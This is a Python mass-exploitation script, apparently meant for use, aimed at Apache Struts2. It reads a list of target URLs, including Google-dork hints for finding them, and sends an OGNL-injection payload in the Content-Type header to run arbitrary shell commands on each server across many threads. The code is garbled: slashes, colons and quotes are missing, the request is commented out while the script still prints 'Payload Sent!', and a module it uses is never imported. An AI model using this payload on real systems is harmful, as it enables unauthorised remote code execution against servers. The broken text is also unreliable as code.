#!usrbinpython
# Dork sitecom filetypeaction
# site example^ org,net,egu,gov,io,pw
#b4ckdoorarchive.host  B4CKDOOR MADE

import urllib2
import httplib
import sys, re, os
from threading import Thread 

strutz = open(sys.argv[1], r).readlines()
cmd =  # COMMAND HERE Arch(s) x86, i686

def exploit(url, cmd)
	#page = ''
	payload = %{(#_='multipartform-data').
	payload += (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
	payload += (#_memberAccess
	payload += (#_memberAccess=#dm)
	payload += ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
	payload += (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
	payload += (#ognlUtil.getExcludedPackageNames().clear()).
	payload += (#ognlUtil.getExcludedClasses().clear()).
	payload += (#context.setMemberAccess(#dm)))).
	payload += (#cmd='%s'). % cmd
	payload += (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
	payload += (#cmds=(#iswin{'cmd.exe','c',#cmd}{'binbash','-c',#cmd})).
	payload += (#p=new java.lang.ProcessBuilder(#cmds)).
	payload += (#p.redirectErrorStream(true)).(#process=#p.start()).
	payload += (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
	payload += (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
	payload += (#ros.flush())}
	try
		url = ''.join(url)
		if http not in url
			url = http+url
		elif https in url
			url = url.replace(https, http)
	   	headers = {'User-Agent' 'Mozilla5.0', 'Content-Type' payload}
	   	request = urllib2.Request(url, headers=headers)
		print 033[32mPayload Sent!
	   	#page = urllib2.urlopen(request).read()
	except httplib.IncompleteRead, e
		pass
	except KeyboardInterrupt
		pass
	except Exception
		pass
	#print n033[35m%s%(page)
 
 
for url in strutz
	try
		l33t = Thread(target=exploit, args=(url,cmd,))
		l33t.start()
		time.sleep(0.09)
	except
		pass#b4ckdoor